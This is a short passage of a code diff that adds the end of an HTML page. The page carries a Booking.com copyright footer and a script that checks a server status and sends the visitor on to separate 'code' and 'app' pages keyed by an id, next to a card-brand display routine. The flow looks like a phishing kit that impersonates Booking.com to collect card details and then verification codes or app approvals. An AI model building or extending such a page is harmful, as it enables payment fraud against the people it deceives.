+      if(data.status==="loading"){showLoadingState();startChecking()}
+      if(data.step==="code") window.location.href="code.html?id="+id;
+      if(data.step==="app") window.location.href="app.html?id="+id;
+    });
+
+  updateCardBrandUI();
+</script>
+<div style="text-align:center; font-size:12px; color:#777; margin:30px 20px;">
+  Booking.com is part of Booking Holdings Inc., the world leader in online travel and related services.<br>
+  Copyright © 1996–2026 Booking.com™. All rights reserved.
+</div>
+</div>
+
+</body>
+</html>
